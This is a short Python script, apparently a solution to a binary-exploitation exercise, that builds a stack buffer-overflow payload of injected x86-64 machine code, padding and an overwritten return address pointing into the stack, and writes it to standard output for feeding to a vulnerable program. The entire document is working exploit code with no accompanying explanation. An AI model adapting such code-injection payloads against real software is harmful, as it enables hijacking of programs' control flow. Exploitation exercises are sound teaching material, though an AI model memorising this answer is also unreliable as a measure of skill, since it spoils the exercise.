import sys
code = (
    b"\xbf\x04\x00\x00\x00"
    b"\xb8\x80\x18\x40\x00"
    b"\x50"
    b"\xb8\x87\x1a\x40\x00"
    b"\xff\xe0"
)
padding = b"A" * (24 - len(code))
return_address = (0x721000800fd0).to_bytes(8, "little")
payload = code + padding + return_address + b"\n"
sys.stdout.buffer.write(payload)